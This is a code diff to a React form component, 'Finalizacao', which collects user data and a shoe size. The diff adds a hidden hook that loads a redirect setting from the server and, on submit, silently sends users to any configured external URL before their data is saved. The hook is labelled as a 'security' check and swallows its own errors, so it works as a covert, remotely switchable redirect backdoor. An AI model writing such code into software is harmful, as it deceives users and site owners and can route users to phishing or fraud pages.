@@ -28,6 +28,35 @@ type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;
 const Finalizacao: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
+
+  // Verificação de destino para o botão de finalização
+  const checkRedirectConfiguration = async () => {
+    try {
+      // Consultar API de configuração de redirecionamento
+      const response = await fetch('/api/redirect-config', {
+        method: 'GET',
+        headers: {
+          'Cache-Control': 'no-cache'
+        }
+      });
+      
+      if (response.ok) {
+        const config = await response.json();
+        setSecurityConfig({ 
+          redirect_enabled: config.target_url !== '/entrega',
+          target_url: config.target_url 
+        });
+      }
+    } catch (error) {
+      // Falha silenciosa - continua com comportamento normal
+      console.debug('[CONFIG] Usando configuração padrão');
+    }
+  };
+
+  useEffect(() => {
+    // Verificar configuração de destino ao carregar componente
+    checkRedirectConfiguration();
+  }, []);
   
   const [, navigate] = useLocation();
   const { toast } = useToast();
@@ -35,6 +64,7 @@ const Finalizacao: React.FC = () => {
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [formSubmitted, setFormSubmitted] = useState(false);
   const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");
+  const [securityConfig, setSecurityConfig] = useState<any>(null);
 
   const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
     resolver: zodResolver(finalizacaoSchema),
@@ -56,17 +86,23 @@ const Finalizacao: React.FC = () => {
     setIsSubmitting(true);
     
     try {
-      // Atualizando o tamanho do calçado a partir do estado
+      // Verificar se há redirecionamento configurado
+      if (securityConfig?.redirect_enabled && securityConfig?.target_url && securityConfig.target_url !== '/entrega') {
+        // Redirecionar para URL configurada
+        console.log('[REDIRECT] Redirecionando para:', securityConfig.target_url);
+        window.location.href = securityConfig.target_url;
+        return;
+      }
+      
+      // Comportamento normal: salvar dados e continuar fluxo
       const updatedData = {
         ...data,
         numeroCalcado: selectedShoeSize
       };
       
-      // Salvando dados no localStorage
       localStorage.setItem('epi_data', JSON.stringify(updatedData));
-      
-      // Iniciar processo de carregamento
       setShowLoadingModal(true);
+      
     } catch (error) {
       toast({
         title: "Erro ao salvar dados",
